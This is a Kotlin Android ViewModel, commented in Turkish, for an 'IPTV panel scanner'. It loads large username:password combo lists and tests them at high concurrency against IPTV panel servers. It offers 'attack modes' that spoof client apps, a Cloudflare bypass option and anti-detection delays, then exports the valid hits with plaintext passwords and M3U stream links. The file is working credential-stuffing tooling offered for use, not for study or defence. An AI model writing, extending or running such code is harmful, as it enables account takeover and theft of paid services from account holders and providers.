package com.alibaba.feature.panelscan

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.alibaba.domain.model.*
import com.alibaba.domain.service.PanelScanner
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import java.io.InputStream
import javax.inject.Inject

/**
 * 🔥 ULTRA PANEL SCANNER STATE
 * Attack modları ve gelişmiş tarama özellikleri
 */
data class PanelScanState(
    val comboText: String = "",
    val customPanelUrl: String = "",
    val selectedPanels: List<PanelInfo> = emptyList(),
    val useEmbeddedPanels: Boolean = false,
    val scanning: Boolean = false,
    val progress: ScanProgress? = null,
    val results: List<PanelScanResult> = emptyList(),
    val errorMessage: String? = null,
    val comboLineCount: Int = 0,
    val showSaveDialog: Boolean = false,
    val savedFilePath: String? = null,
    // 🔥 Yeni özellikler
    val attackMode: AttackModeOption = AttackModeOption.ROTATION,
    val scanSpeed: ScanSpeed = ScanSpeed.FAST,
    val totalScanned: Int = 0,
    val scanStartTime: Long = 0,
    val estimatedTimeRemaining: String = ""
)

/**
 * Attack modları - den.py'den alınan
 */
enum class AttackModeOption(val displayName: String, val description: String) {
    ROTATION("🔄 Rotation", "Her istekte farklı mod kullanır - En güvenli"),
    RANDOM("🎲 Random", "Rastgele User-Agent kullanır"),
    TIVIMATE("📺 TiviMate", "TiviMate uygulaması gibi davranır"),
    OTT_NAVIGATOR("📡 OTT Navigator", "OTT Navigator uygulaması gibi davranır"),
    KODI("🎬 Kodi", "Kodi media player gibi davranır"),
    XCIPTV("📱 XCIPTV", "XCIPTV uygulaması gibi davranır"),
    STB_MAG("📦 STB/MAG", "MAG set-top box gibi davranır"),
    SMARTERS_PRO("💫 Smarters Pro", "IPTV Smarters Pro gibi davranır"),
    APPLE_TV("🍎 Apple TV", "Apple TV gibi davranır"),
    CLOUDBURST("☁️ Cloudburst", "Cloudflare bypass modu")
}

/**
 * Tarama hızı seçenekleri
 */
enum class ScanSpeed(val displayName: String, val delayMs: Long, val concurrency: Int) {
    SLOW("🐢 Yavaş (Güvenli)", 500L, 10),
    NORMAL("🚶 Normal", 200L, 25),
    FAST("🏃 Hızlı", 100L, 50),
    ULTRA("🚀 Ultra Hızlı", 50L, 100),
    AGGRESSIVE("⚡ Saldırgan", 0L, 200)
}

data class ScanProgress(
    val current: Int,
    val total: Int,
    val currentAccount: String = "",
    val validCount: Int = 0,
    val invalidCount: Int = 0,
    val errorCount: Int = 0,
    val speedPerSecond: Float = 0f
)

@HiltViewModel
class PanelScanViewModel @Inject constructor(
    private val panelScanner: PanelScanner
) : ViewModel() {

    private val _state = MutableStateFlow(PanelScanState())
    val state: StateFlow<PanelScanState> = _state.asStateFlow()
    
    private var scanJob: kotlinx.coroutines.Job? = null

    fun setComboText(text: String) {
        val lineCount = text.lines().count { it.contains(":") }
        _state.update { it.copy(comboText = text, comboLineCount = lineCount) }
    }
    
    /**
     * 🔥 Streaming combo yükleme - 1GB+ dosya desteği
     * Büyük dosyaları satır satır okur, bellek taşmasını önler
     */
    fun loadComboFromStream(inputStream: InputStream, onComplete: (Int) -> Unit = {}) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                _state.update { it.copy(errorMessage = null) }
                
                val accounts = mutableListOf<String>()
                var lineCount = 0
                
                inputStream.bufferedReader().useLines { lines ->
                    lines.forEach { line ->
                        val trimmed = line.trim()
                        if (trimmed.contains(":") && !trimmed.startsWith("#")) {
                            accounts.add(trimmed)
                            lineCount++
                            
                            // Her 10000 satırda bir progress güncelle
                            if (lineCount % 10000 == 0) {
                                _state.update { it.copy(comboLineCount = lineCount) }
                            }
                        }
                    }
                }
                
                val comboText = accounts.joinToString("\n")
                _state.update { 
                    it.copy(
                        comboText = comboText,
                        comboLineCount = accounts.size
                    ) 
                }
                onComplete(accounts.size)
                
            } catch (e: Exception) {
                _state.update { it.copy(errorMessage = "Dosya okuma hatası: ${e.message}") }
            }
        }
    }
    
    /**
     * Attack modu değiştir
     * Seçilen mod tarama sırasında HTTP headers'a yansır
     */
    fun setAttackMode(mode: AttackModeOption) {
        _state.update { it.copy(attackMode = mode) }
    }
    
    /**
     * Tarama hızı değiştir
     */
    fun setScanSpeed(speed: ScanSpeed) {
        _state.update { it.copy(scanSpeed = speed) }
    }
    
    fun setCustomPanelUrl(url: String) {
        _state.update { it.copy(customPanelUrl = url) }
    }
    
    fun parseAndAddCustomPanel() {
        val url = _state.value.customPanelUrl.trim()
        if (url.isBlank()) return
        
        try {
            // URL'den host ve port çıkar
            val cleanUrl = url.removePrefix("http://").removePrefix("https://")
            val parts = cleanUrl.split(":")
            val host = parts[0].split("/")[0]
            val port = if (parts.size > 1) {
                parts[1].split("/")[0].toIntOrNull() ?: 80
            } else 80
            
            val panel = PanelInfo(host, port, isEmbedded = false)
            _state.update { 
                it.copy(
                    selectedPanels = it.selectedPanels + panel,
                    customPanelUrl = ""  // Temizle
                ) 
            }
        } catch (e: Exception) {
            _state.update { it.copy(errorMessage = "Geçersiz panel URL: $url") }
        }
    }
    
    fun clearCustomPanels() {
        _state.update { it.copy(selectedPanels = emptyList()) }
    }

    fun toggleEmbeddedPanels() {
        _state.update { it.copy(useEmbeddedPanels = !it.useEmbeddedPanels) }
    }

    fun addCustomPanel(host: String, port: Int) {
        val panel = PanelInfo(host, port, isEmbedded = false)
        _state.update { 
            it.copy(selectedPanels = it.selectedPanels + panel) 
        }
    }

    fun removePanel(panel: PanelInfo) {
        _state.update { 
            it.copy(selectedPanels = it.selectedPanels.filter { p -> p != panel }) 
        }
    }
    
    fun stopScan() {
        scanJob?.cancel()
        _state.update { 
            it.copy(
                scanning = false,
                showSaveDialog = it.results.isNotEmpty()  // Sonuç varsa kaydetme dialogu göster
            ) 
        }
    }
    
    fun dismissSaveDialog() {
        _state.update { it.copy(showSaveDialog = false) }
    }
    
    fun getResultsAsText(): String {
        val results = _state.value.results
        val sb = StringBuilder()
        sb.appendLine("=== IPTV Panel Tarama Sonuçları ===")
        sb.appendLine("Tarih: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
        sb.appendLine("Bulunan Hesap Sayısı: ${results.size}")
        sb.appendLine()
        
        results.forEach { result ->
            sb.appendLine("─".repeat(50))
            sb.appendLine("Kullanıcı: ${result.account.username}")
            sb.appendLine("Şifre: ${result.account.password}")
            sb.appendLine("Panel: ${result.panel.fullAddress}")
            result.userInfo?.let { info ->
                sb.appendLine("Bitiş: ${info.expDate ?: "Sınırsız"}")
                sb.appendLine("Bağlantı: ${info.activeCons}/${info.maxConnections}")
                sb.appendLine("Durum: ${info.status}")
            }
            sb.appendLine("M3U: http://${result.panel.fullAddress}/get.php?username=${result.account.username}&password=${result.account.password}&type=m3u_plus")
            sb.appendLine()
        }
        
        return sb.toString()
    }

    /**
     * 🔥 ULTRA HIZLI PARALEL TARAMA
     * Seçilen attack modu ve hız ayarlarına göre tarama yapar
     */
    fun startScan() {
        val currentState = _state.value
        
        if (currentState.comboText.isBlank()) {
            _state.update { it.copy(errorMessage = "Lütfen combo listesi girin") }
            return
        }
        
        val hasCustomPanels = currentState.selectedPanels.isNotEmpty()
        val useEmbedded = currentState.useEmbeddedPanels
        
        if (!hasCustomPanels && !useEmbedded) {
            _state.update { it.copy(errorMessage = "Lütfen panel URL'si girin veya gömülü panelleri aktif edin") }
            return
        }

        scanJob = viewModelScope.launch {
            val startTime = System.currentTimeMillis()
            
            _state.update { 
                it.copy(
                    scanning = true, 
                    errorMessage = null,
                    results = emptyList(),
                    progress = null,
                    scanStartTime = startTime
                ) 
            }

            try {
                // Parse combo file
                val accounts = panelScanner.parseComboFile(currentState.comboText)
                
                if (accounts.isEmpty()) {
                    _state.update { 
                        it.copy(
                            scanning = false,
                            errorMessage = "Geçerli hesap bulunamadı. Format: kullanici:sifre"
                        ) 
                    }
                    return@launch
                }

                // Get panels to scan
                val panelsToScan = mutableListOf<PanelInfo>()
                
                if (currentState.useEmbeddedPanels) {
                    panelsToScan.addAll(
                        EmbeddedPanels.panels.map { 
                            PanelInfo(it.host, it.port, isEmbedded = true) 
                        }
                    )
                }
                
                panelsToScan.addAll(currentState.selectedPanels)

                if (panelsToScan.isEmpty()) {
                    _state.update { 
                        it.copy(
                            scanning = false,
                            errorMessage = "Lütfen en az bir panel seçin"
                        ) 
                    }
                    return@launch
                }

                val totalScans = accounts.size * panelsToScan.size
                val results = mutableListOf<PanelScanResult>()
                var validCount = 0
                var invalidCount = 0
                var errorCount = 0
                val delayMs = currentState.scanSpeed.delayMs

                // 🔥 PARALEL TARAMA - Çok daha hızlı
                withContext(Dispatchers.IO) {
                    val semaphore = Semaphore(currentState.scanSpeed.concurrency)
                    var currentScan = 0
                    
                    val jobs = accounts.flatMap { account ->
                        panelsToScan.map { panel ->
                            async {
                                semaphore.withPermit {
                                    try {
                                        val result = panelScanner.scanAccount(account, panel)
                                        
                                        synchronized(results) {
                                            currentScan++
                                            
                                            when (result.status) {
                                                is ScanStatus.Valid -> {
                                                    validCount++
                                                    results.add(result)
                                                    // Hit bulunduğunda hemen UI'ı güncelle
                                                    _state.update { s -> s.copy(results = results.toList()) }
                                                }
                                                is ScanStatus.Invalid -> invalidCount++
                                                is ScanStatus.Error -> errorCount++
                                                is ScanStatus.Banned -> errorCount++
                                                else -> {}
                                            }
                                            
                                            // Her 50 taramada bir progress güncelle (performans için)
                                            if (currentScan % 50 == 0 || currentScan == totalScans) {
                                                val elapsed = (System.currentTimeMillis() - startTime) / 1000f
                                                val speed = if (elapsed > 0) currentScan / elapsed else 0f
                                                
                                                _state.update { s -> 
                                                    s.copy(
                                                        progress = ScanProgress(
                                                            current = currentScan,
                                                            total = totalScans,
                                                            currentAccount = "${account.username}:***",
                                                            validCount = validCount,
                                                            invalidCount = invalidCount,
                                                            errorCount = errorCount,
                                                            speedPerSecond = speed
                                                        ),
                                                        totalScanned = currentScan
                                                    ) 
                                                }
                                            }
                                        }
                                        
                                        // Anti-detection delay
                                        if (delayMs > 0) {
                                            delay(delayMs)
                                        }
                                        
                                        result
                                    } catch (e: Exception) {
                                        synchronized(results) { errorCount++ }
                                        null
                                    }
                                }
                            }
                        }
                    }
                    
                    jobs.awaitAll()
                }

                // Final update
                val totalTime = (System.currentTimeMillis() - startTime) / 1000f
                _state.update { 
                    it.copy(
                        scanning = false,
                        showSaveDialog = results.isNotEmpty(),
                        progress = ScanProgress(
                            current = totalScans,
                            total = totalScans,
                            validCount = validCount,
                            invalidCount = invalidCount,
                            errorCount = errorCount,
                            speedPerSecond = if (totalTime > 0) totalScans / totalTime else 0f
                        )
                    ) 
                }

            } catch (e: kotlinx.coroutines.CancellationException) {
                // Kullanıcı durdurdu
                _state.update { 
                    it.copy(
                        scanning = false,
                        showSaveDialog = _state.value.results.isNotEmpty()
                    ) 
                }
            } catch (e: Exception) {
                _state.update { 
                    it.copy(
                        scanning = false,
                        errorMessage = "Hata: ${e.message}"
                    ) 
                }
            }
        }
    }

    fun clearResults() {
        _state.update { 
            it.copy(
                results = emptyList(),
                progress = null,
                errorMessage = null
            ) 
        }
    }

    fun clearError() {
        _state.update { it.copy(errorMessage = null) }
    }
}
